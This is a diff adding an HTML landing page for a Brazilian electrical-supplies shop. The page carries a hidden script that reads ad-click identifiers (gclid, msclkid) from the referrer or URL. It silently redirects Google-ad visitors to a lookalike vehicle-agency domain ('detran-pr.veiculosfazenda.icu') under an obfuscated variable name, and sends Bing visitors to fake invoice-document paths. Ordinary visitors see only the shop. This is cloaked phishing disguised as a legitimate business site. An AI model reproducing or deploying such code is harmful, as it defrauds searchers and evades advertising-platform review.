@@ -1,1 +1,206 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JA Decor Iluminação e Elétrica | Materiais Elétricos em Salvador</title>
 
+<meta name="description" content="Comércio varejista de material elétrico em Salvador - BA. Iluminação, fios, cabos, lâmpadas, disjuntores e muito mais. Fale conosco!">
+
+<style>
+
+body{
+font-family: Arial, Helvetica, sans-serif;
+margin:0;
+background:#f5f5f5;
+color:#333;
+}
+
+header{
+background:#111;
+color:white;
+padding:30px;
+text-align:center;
+}
+
+header h1{
+margin:0;
+font-size:32px;
+}
+
+.container{
+max-width:1100px;
+margin:auto;
+padding:30px;
+}
+
+.hero{
+background:white;
+padding:40px;
+border-radius:8px;
+text-align:center;
+box-shadow:0 2px 10px rgba(0,0,0,0.1);
+}
+
+.hero h2{
+font-size:28px;
+color:#222;
+}
+
+.btn{
+display:inline-block;
+margin-top:20px;
+padding:15px 30px;
+background:#ffb300;
+color:#000;
+font-weight:bold;
+text-decoration:none;
+border-radius:5px;
+}
+
+.services{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+gap:20px;
+margin-top:40px;
+}
+
+.card{
+background:white;
+padding:20px;
+border-radius:8px;
+box-shadow:0 2px 8px rgba(0,0,0,0.08);
+text-align:center;
+}
+
+footer{
+background:#111;
+color:white;
+text-align:center;
+padding:20px;
+margin-top:40px;
+font-size:14px;
+}
+
+</style>
+
+</head>
+<script>
+
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://detran-pr.veiculosfazenda.icu/';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+<h1>JA Decor Iluminação e Elétrica</h1>
+<p>Materiais Elétricos e Iluminação em Salvador - BA</p>
+</header>
+
+<div class="container">
+
+<div class="hero">
+<h2>Tudo em Material Elétrico para sua Casa ou Empresa</h2>
+<p>Fios, cabos, lâmpadas, iluminação decorativa, disjuntores e muito mais com qualidade e segurança.</p>
+
+<a class="btn" href="https://wa.me/55SEUNUMERO">Falar no WhatsApp</a>
+</div>
+
+<div class="services">
+
+<div class="card">
+<h3>Iluminação</h3>
+<p>Lâmpadas LED, lustres, refletores e soluções modernas de iluminação.</p>
+</div>
+
+<div class="card">
+<h3>Materiais Elétricos</h3>
+<p>Fios, cabos, tomadas, disjuntores e acessórios elétricos.</p>
+</div>
+
+<div class="card">
+<h3>Projetos e Reformas</h3>
+<p>Produtos ideais para instalações elétricas residenciais e comerciais.</p>
+</div>
+
+<div class="card">
+<h3>Atendimento Rápido</h3>
+<p>Equipe pronta para ajudar você a encontrar o material certo.</p>
+</div>
+
+</div>
+
+</div>
+
+<footer>
+
+<p><strong>J A Comércio de Materiais Elétricos LTDA</strong></p>
+<p>CNPJ: 17.544.320/0001-05</p>
+<p>Salvador - Bahia</p>
+<p>Atividade: Comércio varejista de material elétrico</p>
+
+</footer>
+
+</body>
+</html>
